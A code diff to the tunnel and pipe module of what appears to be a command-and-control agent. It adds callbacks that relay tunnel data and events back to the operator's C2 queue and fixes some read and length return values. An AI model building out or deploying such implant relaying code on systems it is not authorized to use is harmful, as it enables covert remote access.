@@ -76,7 +76,7 @@ static tlv_pkt_t *net_tunnels(c2_t *c2)
     tlv_pkt_t *tunnel;
 
     core = c2->data;
-    result = api_craft_tlv_pkt(API_CALL_SUCCESS);
+    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
 
     HASH_ITER(hh, core->c2, curr_c2, c2_tmp)
     {
@@ -116,10 +116,10 @@ tlv_pkt_t *net_add_tunnel(c2_t *c2)
 
     if (core_add_uri(core, uri) < 0)
     {
-        return api_craft_tlv_pkt(API_CALL_FAIL);
+        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
     }
 
-    return api_craft_tlv_pkt(API_CALL_SUCCESS);
+    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
 }
 
 tlv_pkt_t *net_suspend_tunnel(c2_t *c2)
@@ -134,7 +134,7 @@ tlv_pkt_t *net_suspend_tunnel(c2_t *c2)
 
     if (id == c2->id)
     {
-        return api_craft_tlv_pkt(API_CALL_FAIL);
+        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
     }
 
     HASH_ITER(hh, core->c2, curr_c2, c2_tmp)
@@ -148,7 +148,7 @@ tlv_pkt_t *net_suspend_tunnel(c2_t *c2)
         break;
     }
 
-    return api_craft_tlv_pkt(API_CALL_SUCCESS);
+    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
 }
 
 tlv_pkt_t *net_activate_tunnel(c2_t *c2)
@@ -171,7 +171,7 @@ tlv_pkt_t *net_activate_tunnel(c2_t *c2)
         break;
     }
 
-    return api_craft_tlv_pkt(API_CALL_SUCCESS);
+    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
 }
 
 tlv_pkt_t *net_restart_tunnel(c2_t *c2)
@@ -200,12 +200,58 @@ tlv_pkt_t *net_restart_tunnel(c2_t *c2)
         curr_c2->tunnel->delay = (float)delay;
         curr_c2->tunnel->keep_alive = keep_alive;
 
-        log_debug("%f\n", curr_c2->tunnel->delay);
         tunnel_start(curr_c2->tunnel);
         break;
     }
 
-    return api_craft_tlv_pkt(API_CALL_SUCCESS);
+    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
+}
+
+void net_client_event_link(int event, void *data)
+{
+    pipe_t *pipe;
+    tlv_pkt_t *result;
+
+    pipe = data;
+    result = api_craft_tlv_pkt(API_CALL_SUCCESS, NULL);
+
+    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_TYPE, NET_CLIENT_PIPE);
+    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_ID, pipe->id);
+    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_HEARTBEAT, event);
+
+    c2_enqueue_tlv(pipe->c2, result);
+    tlv_pkt_destroy(result);
+}
+
+void net_client_read_link(void *data)
+{
+    pipe_t *pipe;
+    size_t length;
+    tunnel_t *tunnel;
+    tlv_pkt_t *result;
+    unsigned char *buffer;
+
+    pipe = data;
+    tunnel = pipe->data;
+    length = tunnel->ingress->bytes;
+
+    buffer = malloc(length);
+    if (buffer == NULL)
+    {
+        return;
+    }
+
+    queue_remove(tunnel->ingress, buffer, length);
+    result = api_craft_tlv_pkt(API_CALL_SUCCESS, NULL);
+
+    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_TYPE, NET_CLIENT_PIPE);
+    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_ID, pipe->id);
+    tlv_pkt_add_bytes(result, TLV_TYPE_PIPE_BUFFER, buffer, length);
+
+    c2_enqueue_tlv(pipe->c2, result);
+
+    tlv_pkt_destroy(result);
+    free(buffer);
 }
 
 static int net_client_create(pipe_t *pipe, c2_t *c2)
@@ -234,8 +280,16 @@ static int net_client_create(pipe_t *pipe, c2_t *c2)
 
     tunnel_set_uri(ctx, uri);
     tunnel_setup(ctx, c2->loop);
-    tunnel_set_links(ctx, NULL, NULL, NULL,
-                     c2->link_data);
+
+    if (pipe->flags & PIPE_INTERACTIVE)
+    {
+        tunnel_set_links(ctx, net_client_read_link, NULL,
+                         net_client_event_link, pipe);
+    }
+    else
+    {
+        tunnel_set_links(ctx, NULL, NULL, NULL, pipe);
+    }
 
     if (tunnel_init(ctx) < 0)
     {
@@ -245,6 +299,7 @@ static int net_client_create(pipe_t *pipe, c2_t *c2)
 
     tunnel_start(ctx);
     pipe->data = ctx;
+    pipe->c2 = c2;
     return 0;
 }
 
@@ -253,7 +308,7 @@ static int net_client_tell(pipe_t *pipe)
     tunnel_t *tunnel;
 
     tunnel = pipe->data;
-    return tunnel->egress->bytes;
+    return tunnel->ingress->bytes;
 }
 
 static int net_client_read(pipe_t *pipe, void *buffer, int length)
@@ -261,8 +316,7 @@ static int net_client_read(pipe_t *pipe, void *buffer, int length)
     tunnel_t *tunnel;
 
     tunnel = pipe->data;
-    queue_remove(tunnel->ingress, buffer, length);
-    return 0;
+    return queue_remove(tunnel->ingress, buffer, length);
 }
 
 static int net_client_write(pipe_t *pipe, void *buffer, int length)
